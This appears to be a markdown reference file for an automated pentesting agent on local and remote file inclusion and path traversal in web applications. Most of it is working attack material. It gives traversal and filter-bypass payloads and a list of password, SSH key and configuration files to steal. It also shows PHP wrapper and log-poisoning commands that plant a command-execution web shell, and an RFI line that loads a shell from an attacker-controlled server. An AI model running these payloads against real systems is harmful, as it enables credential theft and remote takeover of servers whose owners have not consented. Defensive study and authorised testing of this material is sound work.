---
vuln_type: lfi
severity: high
cwe: [CWE-98, CWE-22]
owasp: A01:2021-Broken-Access-Control
related_tools: [curl, ffuf]
exploit_agent: file_inclusion_agent
tags: [lfi, rfi, path-traversal, directory-traversal, file-inclusion, log-poisoning, php-wrappers, rce]
---

# Local File Inclusion (LFI) / Remote File Inclusion (RFI) / Path Traversal

## Overview
Occurs when an application includes files based on user-controllable input without proper path validation. Allows reading arbitrary files from the server (LFI), and in some cases executing remote code (RFI) or achieving RCE through LFI chains.

---

## Types

### Path Traversal (Directory Traversal)
- Read files outside the intended directory
- Uses `../` sequences to navigate the filesystem
- Read-only — no code execution directly

### Local File Inclusion (LFI)
- Application uses `include()`, `require()`, or similar to load a local file
- Attacker controls which file is loaded
- **If the file contains PHP/code, it gets executed** — this is the key difference from path traversal
- Can chain to RCE via log poisoning, PHP wrappers, or uploaded files

### Remote File Inclusion (RFI)
- Application includes a file from a remote URL
- Attacker hosts a malicious file on their server
- Requires `allow_url_include=On` in PHP (disabled by default in modern PHP)
- Direct code execution

---

## Injection Points

| Location | Example | Notes |
|----------|---------|-------|
| URL parameter | `?page=about` | Most common |
| POST body | `file=template.html` | Form-based |
| Cookie | `Cookie: lang=en` | Language selection |
| HTTP header | `X-Template: header.php` | Custom headers |
| URL path | `/static/../../../etc/passwd` | Path segment |

### Common vulnerable parameter names
`page`, `file`, `path`, `include`, `template`, `lang`, `language`, `dir`, `doc`, `folder`, `module`, `view`, `content`, `layout`, `style`, `theme`, `load`, `read`

---

## Detection Techniques

### Step 1: Test basic path traversal
```
?page=../../../etc/passwd
?page=..\..\..\..\windows\win.ini
```

### Step 2: Test with different traversal counts
```
?page=../etc/passwd
?page=../../etc/passwd
?page=../../../etc/passwd
?page=../../../../etc/passwd
?page=../../../../../etc/passwd
?page=../../../../../../etc/passwd
?page=../../../../../../../etc/passwd
```

### Step 3: Check for file extension appending
If the app appends `.php` or `.html`:
```
# Original: include($page . ".php")
# Input: page=../../../etc/passwd
# Becomes: include("../../../etc/passwd.php")  ← fails

# Null byte (PHP < 5.3.4)
?page=../../../etc/passwd%00

# Long path truncation (PHP < 5.3)
?page=../../../etc/passwd............[repeat to 4096 chars]

# PHP wrappers (bypass extension appending)
?page=php://filter/convert.base64-encode/resource=config
```

### Step 4: Determine OS
- Linux: Try `/etc/passwd`
- Windows: Try `C:\Windows\win.ini` or `C:\boot.ini`

---

## Key Files to Read

### Linux
```
/etc/passwd                    # User accounts
/etc/shadow                    # Password hashes (needs root)
/etc/hosts                     # Host mappings
/etc/hostname                  # Server hostname
/proc/self/environ             # Environment variables (may contain secrets)
/proc/self/cmdline             # Current process command
/proc/version                  # Kernel version
/var/log/apache2/access.log    # Apache access log (for log poisoning)
/var/log/apache2/error.log     # Apache error log
/var/log/nginx/access.log      # Nginx access log
/var/log/auth.log              # SSH auth log
/var/log/mail.log              # Mail log
/home/USER/.ssh/id_rsa         # SSH private key
/home/USER/.bash_history       # Command history
/var/www/html/config.php       # Web app config (DB creds)
/var/www/html/.env             # Environment config
/etc/apache2/apache2.conf      # Apache config
/etc/nginx/nginx.conf          # Nginx config
/etc/mysql/my.cnf              # MySQL config
```

### Windows
```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\
C:\Users\ADMIN\Desktop\
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
```

### Application-specific
```
# WordPress
/var/www/html/wp-config.php

# Laravel
/var/www/html/.env

# Django
/var/www/html/settings.py

# Node.js
/var/www/html/.env
/var/www/html/package.json

# Tomcat
/opt/tomcat/conf/tomcat-users.xml
/opt/tomcat/conf/server.xml
```

---

## PHP Wrapper Attacks (LFI → Code Execution)

### php://filter — Read source code as base64
```
?page=php://filter/convert.base64-encode/resource=index
?page=php://filter/convert.base64-encode/resource=config
?page=php://filter/convert.base64-encode/resource=../config
```
Decode output: `echo "BASE64_OUTPUT" | base64 -d`

### php://input — Execute POST body as PHP
Requires `allow_url_include=On`
```bash
curl -X POST "http://target/vuln.php?page=php://input" -d "<?php system('whoami'); ?>"
```

### data:// — Execute inline PHP
Requires `allow_url_include=On`
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=
```
(Base64 of `<?php system('whoami'); ?>`)

### expect:// — Direct command execution
Requires `expect` extension (rare)
```
?page=expect://whoami
?page=expect://id
```

### zip:// — Execute PHP from zip
1. Create PHP shell in a zip file
2. Upload the zip (via file upload feature)
3. Include: `?page=zip:///tmp/uploads/shell.zip%23shell.php`

### phar:// — Execute from phar archive
Similar to zip but with PHP archives:
```
?page=phar:///tmp/uploads/shell.phar/shell.php
```

---

## LFI → RCE via Log Poisoning

### Apache access log
1. Inject PHP into User-Agent:
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" "http://target/"
```
2. Include the log file:
```
?page=../../../var/log/apache2/access.log&cmd=whoami
```

### Apache error log
1. Request a non-existent page with PHP in the URL:
```bash
curl "http://target/<?php system(\$_GET['cmd']); ?>"
```
2. Include error log:
```
?page=../../../var/log/apache2/error.log&cmd=whoami
```

### SSH auth log (`/var/log/auth.log`)
1. SSH with PHP payload as username:
```bash
ssh "<?php system(\$_GET['cmd']); ?>"@target
```
2. Include auth log:
```
?page=../../../var/log/auth.log&cmd=whoami
```

### Mail log
1. Send email with PHP payload:
```bash
# Via SMTP or sendmail
echo "<?php system(\$_GET['cmd']); ?>" | mail -s "test" user@target
```
2. Include mail log:
```
?page=../../../var/log/mail.log&cmd=whoami
```

### /proc/self/environ
If readable, environment variables contain `HTTP_USER_AGENT`:
1. Set User-Agent to PHP code
2. Include `/proc/self/environ`:
```
?page=../../../proc/self/environ
```

---

## LFI → RCE via File Upload Chain

1. Upload a file with PHP code (even if extension is restricted):
   - Rename `shell.php` to `shell.png` but keep PHP content
   - Or embed PHP in image metadata (EXIF)
2. Find the upload path
3. Include the uploaded file:
```
?page=../../uploads/shell.png
```
PHP will execute the PHP code inside the image.

---

## Remote File Inclusion (RFI)

Requires `allow_url_include=On` (PHP — disabled by default since PHP 5.2).

```
?page=http://ATTACKER_SERVER/shell.txt
?page=http://ATTACKER_SERVER/shell.php
```

Shell file content (`shell.txt`):
```php
<?php system($_GET['cmd']); ?>
```

### Detection
```
?page=http://YOUR_INTERACTSH_URL
?page=https://YOUR_INTERACTSH_URL
```
If callback received → RFI possible.

---

## Bypass Techniques

### Traversal sequence filtering (`../` removed)
```
# Double encoding
%252e%252e%252f                   (../)

# URL encoding
%2e%2e%2f                         (../)
..%2f
%2e%2e/

# Nested sequences (if filter is non-recursive)
....//
....\/
..../
....\\

# Mixed slashes (Windows)
..\..\..\etc\passwd
../..\..\etc/passwd

# UTF-8 encoding
%c0%ae%c0%ae/                     (../ in overlong UTF-8)
..%c0%af                          (../ in overlong UTF-8)
```

### Path validation bypass
```
# Start with expected directory
?page=./languages/../../../etc/passwd

# Absolute path (if relative not required)
?page=/etc/passwd

# Using allowed prefix
?page=images/../../../etc/passwd
```

### Null byte (PHP < 5.3.4)
```
?page=../../../etc/passwd%00
?page=../../../etc/passwd%00.php
```

### File extension bypass
```
# PHP wrappers ignore appended extension
?page=php://filter/convert.base64-encode/resource=../../../etc/passwd

# Null byte
?page=../../../etc/passwd%00

# Path truncation (PHP < 5.3, 4096 chars)
?page=../../../etc/passwd/./././.[repeat]
```

### WAF bypass
```
# Non-standard traversal characters
..;/   (Tomcat/Java path parameter)
..\    (Windows backslash)

# Double URL encoding
%252e%252e%252f

# Unicode normalization
..%ef%bc%8f  (fullwidth solidus)
```

---

## Automated Testing

### With ffuf (fuzz file paths)
```bash
# LFI wordlist fuzzing
ffuf -u "http://target/page.php?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs SIZE_OF_ERROR

# Traversal depth fuzzing
ffuf -u "http://target/page.php?file=FUZZ/etc/passwd" -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -mc 200 -fs SIZE_OF_ERROR
```

### With curl (manual verification)
```bash
# Basic LFI test
curl -s "http://target/page.php?file=../../../etc/passwd"

# PHP filter
curl -s "http://target/page.php?file=php://filter/convert.base64-encode/resource=config" | base64 -d

# Log poisoning step 1: inject
curl -A "<?php system(\$_GET['cmd']); ?>" "http://target/"

# Log poisoning step 2: trigger
curl -s "http://target/page.php?file=../../../var/log/apache2/access.log&cmd=id"
```

---

## Output Interpretation

### Confirmed LFI indicators
- `/etc/passwd` content visible (root:x:0:0:...)
- `win.ini` content visible ([fonts] section)
- PHP source code visible via php://filter (base64 decodes to valid PHP)
- Command output visible after log poisoning
- Different file content returned for different paths

### Path traversal vs LFI distinction
- **Path traversal**: Can read files only (no code execution)
- **LFI**: File is included/executed by the application. If you can include a file containing PHP code and it executes → LFI, not just path traversal.

### Not LFI (false positives)
- Application returns generic 404 for all non-existent files
- Path is validated server-side and request is rejected
- File content is reflected but as download (no execution context)
- Application uses a whitelist of allowed file names

### Severity assessment
- **Critical**: LFI → RCE achieved (log poisoning, PHP wrappers, upload chain)
- **Critical**: RFI confirmed (direct remote code execution)
- **High**: Can read sensitive files (config with DB creds, SSH keys, .env)
- **Medium**: Can read system files but no credentials found (/etc/passwd without shadow)
- **Low**: Path traversal confirmed but only non-sensitive files readable
